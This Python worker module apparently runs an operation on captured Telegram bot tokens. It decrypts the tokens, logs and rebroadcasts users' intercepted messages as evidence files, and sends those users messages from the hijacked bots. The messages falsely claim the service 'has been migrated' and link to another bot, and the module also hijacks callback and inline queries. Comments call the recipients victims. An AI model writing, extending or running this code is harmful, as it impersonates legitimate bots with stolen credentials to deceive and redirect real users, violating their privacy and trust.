"""Honeypot flow task definitions."""

from .common import *

from .broadcast import _is_broadcast_claim_valid, _mark_broadcast_failure, _update_message_broadcast_success

@app.task(name="flow.broadcast_honeypot_message")
def broadcast_honeypot_message(credential_id: str, telegram_msg_id: int):
    """Broadcast a single specific honeypot message to the bot's Telegram topic.

    Targets ONLY the specific honeypot message without draining or flushing
    unbroadcasted scraper history (strictly preserving the ENABLE_RAW_MESSAGE_BROADCAST policy).
    """
    if not getattr(settings, "HONEYPOT_BROADCAST_TO_TOPIC", True):
        return "Disabled: honeypot topic broadcast is disabled."

    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _broadcast_single_honeypot_message(credential_id, telegram_msg_id)
    )

async def _broadcast_single_honeypot_message(credential_id: str, telegram_msg_id: int) -> dict:
    from datetime import datetime

    # Strict namespace validation: honeypot messages MUST have negative telegram_msg_id
    if telegram_msg_id >= 0:
        logger.warning(
            f"[HoneypotBroadcast] Refusing non-negative message ID {telegram_msg_id} (not a honeypot message)"
        )
        return {"status": "skipped", "reason": "invalid_honeypot_id"}

    # 1. Fetch the exact message with joined discovered_credentials
    res = await async_execute(
        db.table("exfiltrated_messages")
        .select("*, discovered_credentials!inner(meta)")
        .eq("credential_id", credential_id)
        .eq("telegram_msg_id", telegram_msg_id)
        .limit(1)
    )
    if not res.data:
        return {"status": "not_found", "credential_id": credential_id, "telegram_msg_id": telegram_msg_id}

    msg = res.data[0] if isinstance(res.data, list) else res.data
    file_meta = msg.get("file_meta") if isinstance(msg.get("file_meta"), dict) else {}

    # Preserve the old completed-message short circuit, except when a successful
    # summary still has a pending evidence attachment to finish.
    attachment_only = bool(msg.get("is_broadcasted"))
    if attachment_only and file_meta.get("honeypot_evidence_file_status") != "pending":
        return {"status": "already_broadcasted"}

    # Strict source validation: guarantee only bot_api honeypot messages enter this path
    if file_meta.get("source") != "bot_api":
        logger.warning(
            f"[HoneypotBroadcast] Refusing to broadcast non-honeypot message {telegram_msg_id} (source={file_meta.get('source')})"
        )
        return {"status": "skipped", "reason": "not_honeypot_source"}

    # Atomic claim on this specific message with stale claim (> 5 min) recovery
    from datetime import timedelta
    claim_time = datetime.now(UTC).isoformat()
    stale_claim_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
    claim_update = {"broadcast_claimed_at": claim_time}
    claim_query = (
        db.table("exfiltrated_messages")
        .update(claim_update)
        .eq("id", msg["id"])
    )
    if attachment_only:
        claim_query = (
            claim_query
            .eq("is_broadcasted", True)
            .eq("file_meta->>honeypot_evidence_file_status", "pending")
        )
    else:
        claim_query = claim_query.eq("is_broadcasted", False)
    claim_res = await async_execute(
        claim_query
        .or_(f"broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{stale_claim_cutoff}")
        .select("id")
    )
    if not claim_res.data:
        return {"status": "contended"}

    # Resolve topic & broadcaster
    group_id = settings.MONITOR_GROUP_ID
    broadcaster = get_broadcaster()
    meta = (msg.get("discovered_credentials") or {}).get("meta") or {}
    bot_username = meta.get("bot_username")
    bot_id = meta.get("bot_id")
    if bot_username and bot_username != "unknown" and bot_id:
        topic_name = f"@{bot_username} / {bot_id}"
    elif bot_id:
        topic_name = f"@unknown / {bot_id}"
    else:
        topic_name = f"Cred-{credential_id[:8]}"

    saved_topic_id = meta.get("topic_id")
    try:
        thread_id = await broadcaster.ensure_topic(
            group_id,
            topic_name,
            preferred_topic_id=saved_topic_id,
        )
        if str(saved_topic_id or "") != str(thread_id):
            current = await async_execute(
                db.table("discovered_credentials")
                .select("meta")
                .eq("id", credential_id)
                .limit(1)
            )
            current_meta = (current.data or [{}])[0].get("meta") or meta
            updated_meta = dict(current_meta)
            updated_meta["topic_id"] = thread_id
            await async_execute(
                db.table("discovered_credentials")
                .update({"meta": updated_meta})
                .eq("id", credential_id)
            )
    except Exception as topic_err:
        logger.error(f"[HoneypotBroadcast] Could not ensure topic: {topic_err}")
        await async_execute(
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": None})
            .eq("id", msg["id"])
            .eq("broadcast_claimed_at", claim_time)
        )
        return {"status": "topic_failed", "error": str(topic_err)}

    if not await _is_broadcast_claim_valid(msg["id"], claim_time, lease_minutes=5):
        logger.warning(f"[HoneypotBroadcast] Fenced out immediately pre-send for {msg['id']}")
        return {"status": "fenced_out"}

    if not attachment_only:
        try:
            sent_msg_id = await broadcaster.send_message(group_id, thread_id, msg)
        except Exception as send_err:
            logger.error(f"❌ [HoneypotBroadcast] Send failed: {send_err}")
            if not await _mark_broadcast_failure(msg, send_err, claim_token=claim_time):
                return {"status": "fenced_out"}
            return {"status": "failed", "error": str(send_err)}

        try:
            completed = await _update_message_broadcast_success(
                msg["id"],
                broadcast_message_id=sent_msg_id,
                claim_token=claim_time,
                additional_payload={
                    "file_meta": {
                        **file_meta,
                        "honeypot_evidence_file_status": "pending",
                    },
                },
            )
        except Exception as state_err:
            logger.error(f"❌ [HoneypotBroadcast] Success state update failed: {state_err}")
            if not await _mark_broadcast_failure(msg, state_err, claim_token=claim_time):
                return {"status": "fenced_out"}
            return {"status": "failed", "error": str(state_err)}
        if not completed:
            return {"status": "fenced_out"}
        logger.info(f"✅ [HoneypotBroadcast] Sent message {msg['id']} to topic {thread_id}")

        # Claim the evidence step after committing the successful summary. A
        # second worker can safely resume here if this worker exits meanwhile.
        claim_time = datetime.now(UTC).isoformat()
        attachment_stale_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
        attachment_claim = await async_execute(
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": claim_time})
            .eq("id", msg["id"])
            .eq("is_broadcasted", True)
            .eq("file_meta->>honeypot_evidence_file_status", "pending")
            .or_(f"broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{attachment_stale_cutoff}")
            .select("id")
        )
        if not attachment_claim.data:
            return {"status": "sent", "broadcast_message_id": sent_msg_id}
    else:
        sent_msg_id = msg.get("broadcast_message_id")

    if not await _is_broadcast_claim_valid(msg["id"], claim_time, lease_minutes=5):
        logger.warning(f"[HoneypotBroadcast] Fenced out before evidence send for {msg['id']}")
        return {"status": "fenced_out"}

    try:
        raw_res = await async_execute(
            db.table("honeypot_updates")
            .select("update_id,payload,received_at")
            .eq("credential_id", credential_id)
            .eq("update_id", -telegram_msg_id)
            .limit(1)
        )
        raw_rows = raw_res.data or []
        raw_update = raw_rows[0] if isinstance(raw_rows, list) and raw_rows else raw_rows
        document, filename = _honeypot_evidence_document(msg, raw_update, meta)
        await broadcaster.send_document(group_id, thread_id, document, filename)
    except Exception as document_err:
        logger.error(f"❌ [HoneypotBroadcast] Evidence file send failed: {document_err}")
        try:
            await async_execute(
                db.table("exfiltrated_messages")
                .update({"broadcast_claimed_at": None})
                .eq("id", msg["id"])
                .eq("broadcast_claimed_at", claim_time)
            )
        except Exception:
            logger.exception(f"[HoneypotBroadcast] Could not release evidence claim for {msg['id']}")
        return {
            "status": "evidence_failed",
            "broadcast_message_id": sent_msg_id,
            "error": str(document_err),
        }

    completed = await async_execute(
        db.table("exfiltrated_messages")
        .update({
            "broadcast_claimed_at": None,
            "file_meta": {
                **file_meta,
                "honeypot_evidence_file_status": "sent",
            },
        })
        .eq("id", msg["id"])
        .eq("is_broadcasted", True)
        .eq("broadcast_claimed_at", claim_time)
        .select("id")
    )
    if not completed.data:
        return {"status": "fenced_out"}
    return {"status": "sent", "broadcast_message_id": sent_msg_id}


def _honeypot_evidence_document(
    msg: dict,
    raw_record: dict | None,
    credential_meta: dict,
) -> tuple[bytes, str]:
    """Build an untruncated JSON evidence file for one captured Telegram update."""
    import json

    raw_record = raw_record if isinstance(raw_record, dict) else None
    raw_update = raw_record.get("payload") if raw_record else None
    raw_payload = raw_update if isinstance(raw_update, dict) else {}
    target = next(
        (
            raw_payload.get(key)
            for key in ("message", "channel_post", "edited_message", "edited_channel_post")
            if isinstance(raw_payload.get(key), dict)
        ),
        {},
    )
    sender = target.get("from") if isinstance(target.get("from"), dict) else {}
    if not sender:
        callback = raw_payload.get("callback_query") or raw_payload.get("inline_query") or {}
        sender = callback.get("from") if isinstance(callback, dict) and isinstance(callback.get("from"), dict) else {}
    chat = target.get("chat") if isinstance(target.get("chat"), dict) else {}
    callback = raw_payload.get("callback_query") if isinstance(raw_payload.get("callback_query"), dict) else {}
    callback_message = callback.get("message") if isinstance(callback.get("message"), dict) else {}
    callback_chat = callback_message.get("chat") if isinstance(callback_message.get("chat"), dict) else {}
    inline_query = raw_payload.get("inline_query") if isinstance(raw_payload.get("inline_query"), dict) else {}

    display_parts = [sender.get("first_name"), sender.get("last_name")]
    display_name = " ".join(part.strip() for part in display_parts if isinstance(part, str) and part.strip())
    if not display_name:
        display_name = target.get("author_signature") or msg.get("sender_name") or "Unknown"

    message_text = target.get("text") or target.get("caption")
    if message_text is None and callback:
        message_text = f"[Callback Query] {callback.get('data') or ''}"
    if message_text is None and inline_query:
        message_text = f"[Inline Query] {inline_query.get('query') or ''}"
    if message_text is None:
        message_text = msg.get("content") or ""

    raw_message_id = target.get("message_id") or callback_message.get("message_id")
    raw_chat_id = chat.get("id") or callback_chat.get("id")
    update_id = (raw_record or {}).get("update_id") or raw_payload.get("update_id") or -int(msg["telegram_msg_id"])
    evidence = {
        "message_text": message_text,
        "sender": {
            "telegram_user_id": sender.get("id", msg.get("sender_user_id")),
            "display_name": display_name,
            "username": sender.get("username"),
        },
        "received_by": {
            "credential_id": msg.get("credential_id"),
            "bot_id": credential_meta.get("bot_id"),
            "bot_username": credential_meta.get("bot_username"),
            "received_at": (raw_record or {}).get("received_at"),
        },
        "message_ids": {
            "update_id": update_id,
            "honeypot_telegram_msg_id": msg.get("telegram_msg_id"),
            "telegram_message_id": raw_message_id or (msg.get("file_meta") or {}).get("message_id"),
            "chat_id": raw_chat_id or (msg.get("file_meta") or {}).get("chat_id"),
            "callback_query_id": callback.get("id"),
            "inline_query_id": inline_query.get("id"),
        },
        "raw_telegram_update": raw_update,
    }
    if raw_record is None:
        evidence["raw_copy_note"] = "The raw Telegram update has expired from honeypot_updates retention."

    update_id_str = str(update_id if update_id is not None else "unknown")
    filename = f"honeypot-evidence-{update_id_str}.json"
    return json.dumps(evidence, ensure_ascii=False, indent=2).encode("utf-8"), filename

@app.task(name="flow.honeypot_redirect_sweep")
def honeypot_redirect_sweep():
    """Sweep honeypot_updates for un-redirected messages and send each user
    a redirect to the onboard bot. Fires every 30s via beat.

    The message is sent FROM the captured bot (using its decrypted token)
    TO the user — looks like the bot itself is directing them.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_honeypot_redirect_sweep_logic())

_LUA_RELEASE_RESERVATION = """
if redis.call("get", KEYS[1]) == ARGV[1] then
    return redis.call("del", KEYS[1])
else
    return 0
end
"""

def _safe_release_redis_reservation(client, key: str, token: str) -> None:
    try:
        client.eval(_LUA_RELEASE_RESERVATION, 1, key, token)
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")

async def _honeypot_redirect_sweep_logic() -> dict:
    if not settings.HONEYPOT_REDIRECT_MODE:
        return {"status": "disabled", "reason": "mode_disabled"}
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        return {"status": "skipped", "reason": "not_authorized"}

    from datetime import UTC, datetime, timedelta

    try:
        # Clear stale claims (> 15 min old) across all honeypot update rows
        stale_threshold = (datetime.now(UTC) - timedelta(minutes=15)).isoformat()
        with contextlib.suppress(Exception):
            await async_execute(
                db.table("honeypot_updates")
                .update({"redirect_claimed_at": None})
                .not_.is_("redirect_claimed_at", "null")
                .lt("redirect_claimed_at", stale_threshold)
            )

        # Get un-redirected message-type updates
        res = await async_execute(
            db.table("honeypot_updates")
            .select("id, credential_id, payload, received_at, update_type")
            .is_("redirected_at", "null")
            .is_("redirect_claimed_at", "null")
            .in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])
            .order("received_at", desc=False)
            .limit(50)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    rows = res.data or []
    if not rows:
        return {"status": "idle", "pending": 0}

    dispatched = 0
    skipped = 0

    # INTR-002 / CONC-002: claim-before-dispatch using redirect_claimed_at.
    # A concurrent sweep never re-dispatches the same row before honeypot_redirect_one
    # writes the final timestamp. On dispatch success the sub-task flips it to a
    # real ISO timestamp; on send failure it clears redirect_claimed_at back to NULL.

    for row in rows:
        payload = row.get("payload") or {}
        credential_id = row.get("credential_id")
        update_type = row.get("update_type") or "message"

        # Extract user_id and chat_id based on update_type
        user_id = None
        chat_id = None
        from_user = {}

        if update_type == "message":
            msg = payload.get("message") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id")
            chat_id = msg.get("chat", {}).get("id")
        elif update_type == "callback_query":
            cb = payload.get("callback_query") or {}
            from_user = cb.get("from") or {}
            user_id = from_user.get("id")
            chat_id = cb.get("message", {}).get("chat", {}).get("id") or user_id
        elif update_type == "inline_query":
            iq = payload.get("inline_query") or {}
            from_user = iq.get("from") or {}
            user_id = from_user.get("id")
            chat_id = user_id  # Inline: use user_id
        elif update_type == "edited_message":
            msg = payload.get("edited_message") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id")
            chat_id = msg.get("chat", {}).get("id")
        elif update_type == "channel_post":
            msg = payload.get("channel_post") or {}
            from_user = msg.get("from") or {}
            user_id = from_user.get("id") if not from_user.get("is_bot") else None
            chat_id = msg.get("chat", {}).get("id")

        # Skip bots, missing data
        if not user_id or not chat_id or not credential_id:
            skipped += 1
            continue
        if from_user.get("is_bot"):
            skipped += 1
            continue

        # Per-user dedup: atomically acquire Redis reservation with NX (set only if not exists)
        now_claim = datetime.now(UTC).isoformat()
        claim_token = now_claim
        dedup_key = f"redirect:sent:{credential_id}:{user_id}"
        owner_token = f"claiming:{row['id']}:{claim_token}"
        reserved_dedup = False
        try:
            from app.core.redis_srv import redis_srv
            # 300s temporary hold with attempt-unique owner_token prevents races across sweepers
            reserved_dedup = bool(redis_srv.client.set(dedup_key, owner_token, nx=True, ex=300))
            if not reserved_dedup:
                # Key already exists: another row/worker is actively processing or already sent redirect
                with contextlib.suppress(Exception):
                    await async_execute(
                        db.table("honeypot_updates")
                        .update({
                            "redirected_at": datetime.now(UTC).isoformat(),
                            "redirect_claimed_at": None,
                            "redirected_bot": "dedup_skip",
                        })
                        .eq("id", row["id"])
                    )
                skipped += 1
                continue
        except Exception as redis_exc:
            logger.warning(f"[HoneypotSweep] Redis error during reservation for {dedup_key}: {redis_exc}")
            skipped += 1
            continue

        # INTR-002 / CONC-002: atomic claim — set redirect_claimed_at only
        # if redirected_at and redirect_claimed_at are still NULL. If another sweep
        # already claimed the row, this returns zero rows and we move on. Prevents duplicate DM to victim.
        try:
            claim_res = await async_execute(
                db.table("honeypot_updates")
                .update({"redirect_claimed_at": claim_token})
                .eq("id", row["id"])
                .is_("redirected_at", "null")
                .is_("redirect_claimed_at", "null")
            )
            if not claim_res.data:
                logger.debug(f"[HoneypotSweep] claim contended for row {row['id']}")
                if reserved_dedup:
                    _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
                skipped += 1
                continue
        except Exception as claim_exc:
            logger.warning(f"[HoneypotSweep] claim failed for row {row['id']}: {claim_exc}")
            if reserved_dedup:
                _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
            skipped += 1
            continue

        # Dispatch redirect with update_type and claim_token for fenced completion
        app.send_task(
            "flow.honeypot_redirect_one",
            kwargs={
                "update_id": row["id"],
                "credential_id": credential_id,
                "user_id": user_id,
                "chat_id": chat_id,
                "update_type": update_type,
                "claim_token": now_claim,
            },
        )
        dispatched += 1

    # Durable retry for deferred honeypot broadcasts (reclaiming stale unbroadcasted messages older than 5m)
    stale_broadcast_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
    try:
        unbroadcasted = await async_execute(
            db.table("exfiltrated_messages")
            .select("credential_id, telegram_msg_id")
            .eq("is_broadcasted", False)
            .eq("file_meta->>source", "bot_api")
            .lt("telegram_msg_id", 0)
            .or_(f"broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{stale_broadcast_cutoff}")
            .limit(20)
        )
        for h_msg in (unbroadcasted.data or []):
            app.send_task(
                "flow.broadcast_honeypot_message",
                kwargs={
                    "credential_id": h_msg["credential_id"],
                    "telegram_msg_id": h_msg["telegram_msg_id"],
                },
            )
    except Exception as e:
        logger.debug(f"[HoneypotSweep] deferred broadcast retry error: {e}")

    return {"status": "ok", "dispatched": dispatched, "skipped": skipped, "pending": len(rows)}

@app.task(name="flow.honeypot_redirect_one")
def honeypot_redirect_one(
    update_id: str,
    credential_id: str,
    user_id: int,
    chat_id: int,
    update_type: str = "message",
    claim_token: str | None = None,
):
    """Send a redirect message to a single user via the captured bot's token."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id, update_type, claim_token=claim_token)
    )

async def _honeypot_redirect_one_logic(
    update_id: str,
    credential_id: str,
    user_id: int,
    chat_id: int,
    update_type: str = "message",
    claim_token: str | None = None,
) -> dict:
    from datetime import datetime, timedelta

    import httpx

    from app.workers.tasks.honeypot_redirect_strategies import HoneypotRedirectStrategies

    dedup_key = f"redirect:sent:{credential_id}:{user_id}"
    owner_token = f"claiming:{update_id}:{claim_token}" if claim_token else None

    async def _is_fence_valid() -> bool:
        if not claim_token:
            return False
        try:
            # Lease check: claim must be fresh and within 10 minutes (sweep reclaims at 15m)
            stale_lease_cutoff = (datetime.now(UTC) - timedelta(minutes=10)).isoformat()
            check = await async_execute(
                db.table("honeypot_updates")
                .select("id")
                .eq("id", update_id)
                .eq("redirect_claimed_at", claim_token)
                .is_("redirected_at", "null")
                .gte("redirect_claimed_at", stale_lease_cutoff)
                .limit(1)
            )
            return bool(check.data)
        except Exception as check_exc:
            logger.warning(f"[HoneypotRedirect] fence check error for {update_id}: {check_exc}")
            return False

    # Recheck both safety gates for queued jobs. Report the ACTUAL gate that
    # failed — the previous shared "not_authorized" reason for both was
    # misleading when triaging (LOGIC-005). If the gates are off we also release
    # the sweep-side "pending" claim so the row can be tried again once the
    # operator flips the gate back on.
    async def _release_pending_claim(reason_tag: str) -> None:
        if not claim_token:
            return
        try:
            query = (
                db.table("honeypot_updates")
                .update({"redirect_claimed_at": None, "redirected_at": None})
                .eq("id", update_id)
                .eq("redirect_claimed_at", claim_token)
            )
            await async_execute(query)
            logger.debug(
                f"[HoneypotRedirect] released pending claim on {update_id} ({reason_tag})"
            )
        except Exception as _release_exc:
            logger.debug(
                f"[HoneypotRedirect] could not release pending claim: {_release_exc}"
            )
        # Release temporary claiming reservation atomically using owner_token
        if owner_token:
            try:
                from app.core.redis_srv import redis_srv
                _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
            except Exception as _swallowed:
                logger.debug(f"[suppressed] {_swallowed}")

    if not settings.HONEYPOT_REDIRECT_MODE:
        await _release_pending_claim("mode_disabled")
        return {"status": "skipped", "reason": "mode_disabled"}
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        await _release_pending_claim("not_authorized")
        return {"status": "skipped", "reason": "not_authorized"}

    # Strict fence: jobs without a claim_token are completely disallowed from executing
    if not claim_token:
        logger.warning(
            f"🔀 [Redirect] Missing claim_token for row {update_id} — unfenced execution rejected"
        )
        return {"status": "fenced_out", "reason": "missing_claim_token"}

    redirect_bot = settings.HONEYPOT_REDIRECT_BOT
    deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
    redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
    # Level 3: Callback query hijack
    if update_type == "callback_query":
        payload = await async_execute(
            db.table("honeypot_updates")
            .select("payload")
            .eq("id", update_id)
            .limit(1)
        )
        if not payload.data:
            return {"status": "payload_not_found"}

        cb = payload.data[0].get("payload", {}).get("callback_query", {})
        callback_id = cb.get("id")

        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
        if not bot_token:
            return {"status": "token_decrypt_failed"}

        # Immediate pre-send fence check directly before outbound API call
        if not await _is_fence_valid():
            logger.warning(f"🔀 [Callback] Fenced out immediately pre-send for {update_id}")
            return {"status": "fenced_out", "credential_id": credential_id}

        sent_ok = await HoneypotRedirectStrategies.send_callback_hijack(
            bot_token, callback_id, redirect_url, redirect_bot
        )

        if sent_ok:
            updated = await HoneypotRedirectStrategies.update_redirect_record(
                update_id, user_id, redirect_bot, claim_token=claim_token
            )
            if not updated:
                logger.warning(f"🔀 [Callback] Fenced out post-send for {update_id}")
                return {"status": "fenced_out", "credential_id": credential_id}
            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
        else:
            # INTR-002: release the sweep-side "pending" claim so the next
            # sweep can retry this row instead of leaving it stuck.
            await _release_pending_claim("callback_send_failed")

        logger.info(
            f"🔀 [Callback] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
        )
        return {"status": "callback_handled", "sent": sent_ok}

    # Level 4: Inline query hijack
    elif update_type == "inline_query":
        payload = await async_execute(
            db.table("honeypot_updates")
            .select("payload")
            .eq("id", update_id)
            .limit(1)
        )
        if not payload.data:
            return {"status": "payload_not_found"}

        iq = payload.data[0].get("payload", {}).get("inline_query", {})
        inline_id = iq.get("id")
        query_text = iq.get("query", "")

        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
        if not bot_token:
            return {"status": "token_decrypt_failed"}

        # Immediate pre-send fence check directly before outbound API call
        if not await _is_fence_valid():
            logger.warning(f"🔀 [Inline] Fenced out immediately pre-send for {update_id}")
            return {"status": "fenced_out", "credential_id": credential_id}

        sent_ok = await HoneypotRedirectStrategies.send_inline_hijack(
            bot_token, inline_id, query_text, redirect_url, redirect_bot
        )

        if sent_ok:
            updated = await HoneypotRedirectStrategies.update_redirect_record(
                update_id, user_id, redirect_bot, claim_token=claim_token
            )
            if not updated:
                logger.warning(f"🔀 [Inline] Fenced out post-send for {update_id}")
                return {"status": "fenced_out", "credential_id": credential_id}
            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
        else:
            # INTR-002: release the sweep-side "pending" claim on failure.
            await _release_pending_claim("inline_send_failed")

        logger.info(
            f"🔀 [Inline] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
        )
        return {"status": "inline_handled", "sent": sent_ok}

    # Get the captured bot's token
    try:
        cred = await async_execute(
            db.table("discovered_credentials")
            .select("bot_token")
            .eq("id", credential_id)
            .limit(1)
        )
        if not cred.data:
            return {"status": "credential_not_found"}
        bot_token = security.decrypt(cred.data[0]["bot_token"]).strip()
    except Exception as e:
        # Mark the row with error
        with contextlib.suppress(Exception):
            query = db.table("honeypot_updates").update({"redirect_error": f"token_decrypt: {str(e)[:100]}"}).eq("id", update_id)
            if claim_token:
                query = query.eq("redirect_claimed_at", claim_token)
            await async_execute(query)
        await _release_pending_claim("token_decrypt_failed")
        return {"status": "token_decrypt_failed", "error": str(e)[:200]}

    # BUG-3 FIX: Define redirect_1 text for normal message path
    text = (
        "⚠️ This service has been migrated.\n"
        "Your request could not be processed here.\n"
        "To continue, use the updated channel:\n"
        f"👉 {redirect_url}\n"
        "This is an automated notification."
    )

    # Immediate pre-send fence check directly before outbound Bot API call
    if not await _is_fence_valid():
        logger.warning(f"🔀 [Redirect] Fenced out immediately pre-send for {update_id}")
        return {"status": "fenced_out", "credential_id": credential_id}

    # Send the message via Bot API
    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            r = await client.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": text,
                    "disable_web_page_preview": False,
                },
            )
            resp = r.json() if r.status_code == 200 else {}
            sent_ok = r.status_code == 200 and resp.get("ok")
    except Exception as e:
        sent_ok = False
        resp = {"error": str(e)[:200]}

    # BUG-4 FIX: Write redirect_1_sent_at on first successful send
    # BUG-5 FIX: Only mark redirected_at / dedup on successful delivery
    now = datetime.now(UTC).isoformat()
    try:
        if sent_ok:
            update_payload = {
                "redirected_at": now,
                "redirect_claimed_at": None,
                "redirected_bot": redirect_bot,
                "sender_user_id": user_id,
                "redirect_1_sent_at": now,
                "redirect_attempt": 1,
            }
        else:
            # INTR-002: on failure, ALSO clear the sweep-side claim
            # by writing redirected_at=None, redirect_claimed_at=None so the next sweep can retry.
            update_payload = {
                "redirected_at": None,
                "redirect_claimed_at": None,
                "redirect_error": str(resp.get("description") or resp.get("error", "unknown"))[:200],
                "sender_user_id": user_id,
            }
        query = (
            db.table("honeypot_updates")
            .update(update_payload)
            .eq("id", update_id)
            .eq("redirect_claimed_at", claim_token)
        )
        update_res = await async_execute(query)
        if not update_res.data:
            logger.warning(
                f"🔀 [Redirect] Fenced out post-send: claim_token {claim_token} expired or overwritten on row {update_id}"
            )
            return {"status": "fenced_out", "credential_id": credential_id}
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")

    # BUG-5 FIX: Set permanent dedup key on success, or safely release claiming reservation on failure
    try:
        from app.core.redis_srv import redis_srv
        if sent_ok:
            redis_srv.client.set(dedup_key, "1")
        else:
            _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")

    if sent_ok:
        logger.info(
            f"🔀 [Redirect] sent via cred:{credential_id[:8]}... "
            f"→ @{redirect_bot}"
        )
    else:
        logger.warning(
            f"🔀 [Redirect] FAILED cred:{credential_id[:8]}...: "
            f"{resp.get('description', resp.get('error', 'unknown'))}"
        )

    return {
        "status": "sent" if sent_ok else "failed",
        "credential_id": credential_id,
        "bot": redirect_bot,
    }
